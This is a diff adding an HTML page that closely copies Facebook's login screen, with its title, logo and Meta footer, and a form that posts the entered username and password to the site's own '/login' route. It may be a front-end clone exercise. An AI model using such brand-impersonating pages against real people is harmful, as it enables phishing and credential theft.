@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="/stylesheets/src/output.css" rel="stylesheet" />
+    <link rel="icon" type="image/ico" href="/images/favicon.ico" />
+
+    <title>Facebook -log in or sign up</title>
+  </head>
+  <body class="m-0 p-0">
+    <div class="login-container bg-[color:#F2F4F7] h-170 max-w-none">
+      <div
+        class="container mx-auto py-40 flex justify-center items-center p-10"
+      >
+        <div class="left w-150 mb-23 mr-15">
+          <img class="w-80" src="/images/facebook.svg" alt="facebook-logo" />
+          <p class="text-3xl mx-8">
+            Facebook helps you connect and share with the people in your life.
+          </p>
+        </div>
+        <form
+          action="/login"
+          method="post"
+          class="right flex flex-col justify-center p-3 bg-white w-1/4 rounded-xl shadow-2xl"
+        >
+          <input
+            name="username"
+            class="px-4 h-12 border-1 border-gray-300 my-2 rounded-xl outline-blue-600 outline-0.5"
+            type="text"
+            placeholder="Email adress or phone number"
+          />
+          <input
+            name="password"
+            class="px-4 h-12 border-1 border-gray-300 my-2 rounded-xl outline-blue-600 outline-0.5"
+            type="password"
+            placeholder="Password"
+          />
+          <input
+            type="submit"
+            value="Log in"
+            class="bg-[color:#1877F2] my-3 cursor-pointer p h-12 text-2xl text-white font-semibold text-center rounded-xl hover:bg-blue-500"
+          />
+          <a
+            href="forgotpage.html"
+            class="text-center my-3 cursor-pointer text-[color:#1877F2] text-m"
+            >Forgotten password?</a
+          >
+          <hr class="text-gray-300 my-3" />
+          <a href="createnew.html" class="mx-auto"
+            ><button
+              class="bg-[color:#42B72A] cursor-pointer my-3 px-4 h-12 text-l text-white font-bold text-center rounded-l hover:bg-green-600"
+            >
+              Create new account
+            </button></a
+          >
+        </form>
+      </div>
+    </div>
+
+    <div class="bottom w-250 h-auto my-10 mx-auto text-xs text-gray-500">
+      <div class="plus-para flex my-3 items-center">
+        <p class="[word-spacing:10px]">
+          English (UK) मराठी हिन्दी اردو ગુજરાતી ಕನ್ನಡ ਪੰਜਾਬੀ தமிழ் বাংলা తెలుగు
+          മലയാളം
+        </p>
+        <a
+          href="#"
+          class="bg-[color:#EBEDF0] w-8 h-5 mx-1.5 text-center font-extrabold text-xl flex justify-center items-center"
+          >+</a
+        >
+      </div>
+      <hr class="text-gray-300" />
+      <p class="[word-spacing:10px]">
+        Sign Up Log in Messenger Facebook Lite Video Meta PayMeta Store Meta
+        Quest Ray-Ban Meta Meta AIMeta AI more content Instagram Threads Voting
+        Information CentrePrivacy PolicyPrivacy Centre About Create ad Create
+        Page Developers Careers Cookies Ad Choices Terms Help Contact uploading
+        and non-users Settings
+      </p>
+      <span>Meta © 2025</span>
+    </div>
+  </body>
+</html>
